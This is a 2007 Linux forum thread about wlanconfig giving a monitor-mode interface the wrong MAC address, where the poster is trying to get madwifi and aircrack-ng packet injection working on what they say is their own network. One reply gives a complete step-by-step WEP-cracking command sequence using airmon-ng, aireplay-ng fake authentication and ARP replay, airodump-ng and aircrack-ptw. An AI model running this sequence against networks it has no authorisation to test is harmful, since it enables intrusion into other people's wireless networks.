---
title: "wlanconfig creating new interface with wrong MAC"
date: 2007-07-19
forum: Networking &amp; Wireless
---

### Post by Siph0n on 2007-07-19
When I use this command: sudo wlanconfig ath1 create wlandev wifi0 wlanmode monitor , to create an ath1 network interface in monitor mode, it should set the MAC address of that interface to my network cards MAC address right? Instead, it changes it slightly, and I think its causing some problems when I try to run the aircrack suite. The MAC address of my network card is 00:XX:XX:XX:XX:XX , but when I run that wlanconfig command the MAC address of my ath1 interface becomes 06:XX:XX:XX:XX:XX. Does anyone have any ideas why? or if this is why my injection isn't working? Also, should I be using the 06:XX:XX:XX:XX:XX address as my card MAC address, or the 00:XX:XX:XX:XX:XX address for my card MAC address? Any help would be appreciated, thanx! :)

PS: This is being run on my own network.

---

### Post by tturrisi on 2007-07-19
What driver are you using?
Aircrack-ng won't work with the madwifi in Ubuntu (restricted).  You have to uninstall the restricted madwifi driver, build & install the madwifi from source & path them using the aircrack-ng madwifi patch.
see:
[http://www.aircrack-ng.org/doku.php?id=madwifi-ng](http://www.aircrack-ng.org/doku.php?id=madwifi-ng)

> [http://www.aircrack-ng.org/doku.php?id=madwifi-ng](http://www.aircrack-ng.org/doku.php?id=madwifi-ng)
You should delete all existing VAP before before creating a VAP in monitor mode, using airmon-ng stop athX (replacing X with the interface number to delete).

---

### Post by Siph0n on 2007-07-19
I uninstalled the restricted driver and installed and patched the new madwifi driver from its source, so I will try deleting all existing VAP's before I create the one in monitor mode. After I create the VAP in monitor mode, can I also create one in Managed mode, so that I can still be online? Or is this not possible?

---

### Post by Siph0n on 2007-07-19
I tried deleting all of the ath interfaces and than creating the one in monitor mode, but still no luck :( After all the ath interfaces are down I do, 

```
sudo wlanconfig ath1 create wlandev wifi0 wlanmode monitor
sudo ifconfig ath1 up
```

iwconfig and ifconfig both show the wrong MAC address, off by 1 number from my network cards real mac address. I got this working before, with packet injection, but tried it again and it didnt work, and hasnt worked since :( Any more ideas?

---

### Post by tturrisi on 2007-07-19
```
airmon-ng stop ath0
airmon-ng start wifi0 11 # where 11 = channel of the ap
ifconfig ath0 up  # or ath1 or ath2 as was reported as started in previous step
aireplay-ng -1 0 -e THE-ESSID -a 00:0F:B5:9F:DD:04 -h 00:11:95:69:94:F4 ath0
#where THE-ESSID = the essis name to crack, first mac is address of ap, second is address of adapter
in a new term:
airodump-ng -c 11 --bssid 00:0F:B5:9F:DD:04 -w output ath0 #use mac of ap
in a new term:
aireplay-ng -3 -b 00:0F:B5:9F:DD:04 -h 00:11:95:69:94:F4 ath0  # ap mac, adapter mac
in a new term
aircrack-ptw output-01.cap

should take less than 3 minutes for 64 bit wep, 10 min for 128 bit wep
```

---

### Post by Siph0n on 2007-07-20
Ok thanx tturrisi! I will try those steps when I get home. However, this step: airmon-ng start wifi0 11 # where 11 = channel of the ap , usually gives me some sort of error, but I don't know what exactly. Thats why I was using the wlanconfig method to create an interface in monitor mode.

---

